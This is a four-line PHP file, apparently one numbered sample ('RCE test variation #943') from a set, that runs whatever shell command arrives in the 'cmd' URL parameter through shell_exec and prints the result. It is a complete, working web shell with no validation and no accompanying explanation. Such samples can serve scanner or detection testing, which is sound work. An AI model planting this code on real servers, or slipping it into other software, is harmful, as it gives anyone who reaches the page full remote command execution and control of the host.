<?php
// RCE test variation #943
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>